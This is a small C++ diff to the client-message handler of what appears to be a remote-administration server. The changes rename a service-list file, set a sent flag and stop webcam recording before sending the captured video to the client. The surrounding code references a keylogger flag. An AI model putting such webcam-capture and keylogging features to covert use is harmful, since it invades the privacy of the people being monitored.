@@ -80,7 +80,7 @@ void ServerSocket::ProcessClientMessage() {
 	else if (query == 14)
 	{
 		vector <pair<wstring, wstring>> services = ListServices();
-		string filePath = "_Data/ClientList/ListApp";
+		string filePath = "_Data/ClientList/ListService";
 		fstream file(filePath, ios::out);
 		if (!file.is_open())
 		{
@@ -191,6 +191,7 @@ void ServerSocket::ProcessClientMessage() {
 				file.read(buffer, fileSize);
 				send(clientSocket, buffer, fileSize, 0);
 			}
+			sent = true;
 		}
 		else {
 			result = "N";
@@ -231,6 +232,8 @@ void ServerSocket::ProcessClientMessage() {
 	else if (query == 27) {
 		if (!isWebcamOn) result = "N";
 		else {
+			isWebcamOn = false;
+			this_thread::sleep_for(std::chrono::duration<double>(1.0));
 			fstream file("_Data/Webcam/webcam.avi", ios::binary | ios::in);
 			isKeyloggerOn = false;
 			file.seekg(0, ios::end);
@@ -250,11 +253,8 @@ void ServerSocket::ProcessClientMessage() {
 			}
 			file.close();
 			sent = true;
-			isWebcamOn = false;
-			result = "Y";
 		}
 	}
-	
 	if (sent) return;
 	Send();
 }
